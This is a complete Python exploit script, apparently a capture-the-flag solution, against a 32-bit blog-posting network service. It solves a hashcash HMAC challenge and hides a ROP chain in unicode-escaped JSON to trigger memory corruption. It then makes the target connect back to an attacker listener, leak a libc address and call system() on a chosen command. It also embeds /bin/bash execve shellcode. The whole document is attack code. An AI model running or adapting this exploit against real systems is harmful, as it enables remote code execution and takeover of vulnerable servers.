from socket import *
import sys, struct
import hashlib, hmac

SHELLCODE = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
             "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
             "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
             "\x51\x53\x89\xe1\xcd\x80")

COMMAND = 'id\0'

CLEAN_C = 0x0804964D
CLEAN_8 = 0x0804964E
ADDR_SRAND = 0x0804BCD4
ADDR_CLOSE = 0x0804BD7C
JMP_MEMCPY = 0x08048E60
POST_BLOG_ARTICLE = 0x08049F20
JMP_DUP2 = 0x08048E50
JMP_WRITE = 0x08048D40
JMP_READ = 0x08048DB0
ADDR_SETSOCKOPT = 0x0804BD94
JMP_SETSOCKOPT = 0x08048F20
DELTA_SETSOCKOPT_SYSTEM = 0x96f50

def readline(s):
    res = ''
    c = None
    while c != '\n':
        c = s.recv(1)
        res += c
    return res

def add_junk(payload):
    junk = 'A' * 0x7f
    junk += r'\\u4241' # trigger vuln
    junk += 'B' * 0x1f

    if len(payload) & 1 == 1:
        payload += '\0'

    # encode payload
    for i in xrange(0, len(payload), 2):
        junk += r'\\u%.2x%.2x' % (ord(payload[i]), ord(payload[i + 1]))
    return junk

def gen_json(kv):
    res = []
    for k, v in kv:
        if type(v) is list:
            v = ','.join(['"' + e + '"' for e in v])
            res.append('"%s" : [%s]' % (k, v))
        else:
            res.append('"%s" : "%s"' % (k, v))
    return '{' + ','.join(res) + '}'

def gen_msg(token, contents, title, serverip):
    for i in xrange(0x40000):
        j = token + '\n' + '// ' + str(i) + '\n'
        j += gen_json([
            ('title', title),
            ('contents', contents),
            ('serverip', serverip),
        ])
        h = hmac.new(token, j, hashlib.sha1).digest()
        if h[:2] == '\0\0':
            return j
    raise Exception('hashcash failed')

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])

    payload = ''
    payload += struct.pack('<L', JMP_MEMCPY)
    payload += struct.pack('<L', CLEAN_C)
    payload += struct.pack('<L', ADDR_CLOSE)
    payload += struct.pack('<L', ADDR_SRAND)
    payload += struct.pack('<L', 4)

    payload += struct.pack('<L', POST_BLOG_ARTICLE)

    payload += struct.pack('<L', JMP_DUP2)
    payload += struct.pack('<L', CLEAN_8)
    payload += struct.pack('<L', 0)
    payload += struct.pack('<L', 1)

    payload += struct.pack('<L', JMP_DUP2)
    payload += struct.pack('<L', CLEAN_8)
    payload += struct.pack('<L', 0)
    payload += struct.pack('<L', 2)

    payload += struct.pack('<L', JMP_WRITE)
    payload += struct.pack('<L', CLEAN_C)
    payload += struct.pack('<L', 1)
    payload += struct.pack('<L', ADDR_SETSOCKOPT)
    payload += struct.pack('<L', 4)

    payload += struct.pack('<L', JMP_READ)
    payload += struct.pack('<L', CLEAN_C)
    payload += struct.pack('<L', 0)
    payload += struct.pack('<L', ADDR_SETSOCKOPT)
    payload += struct.pack('<L', 4 + len(COMMAND))

    payload += struct.pack('<L', JMP_SETSOCKOPT)
    payload += 'BBBB'
    payload += struct.pack('<L', 4 + ADDR_SETSOCKOPT)

    payload += 'BBBB'

    payload = add_junk(payload)

    s = create_connection((ip, port))

    ss = socket()
    ss.bind((s.getsockname()[0], 0))
    ss.listen(5)

    token = readline(s)
    token = token[1:-2]
    msg = gen_msg(token, 'contents_f', payload, '%s:%d' % ss.getsockname())
    s.send(msg)
    s.close()

    cs = ss.accept()[0]
    data = cs.recv(4096)
    data = cs.recv(4096)

    addr_setsockopt = struct.unpack('<L', data)[0]
    addr_system = addr_setsockopt - DELTA_SETSOCKOPT_SYSTEM
    cs.send(struct.pack('<L', addr_system) + COMMAND)
    print cs.recv(2048)
    cs.close()

    ss.close()

if '__main__' == __name__:
    main()

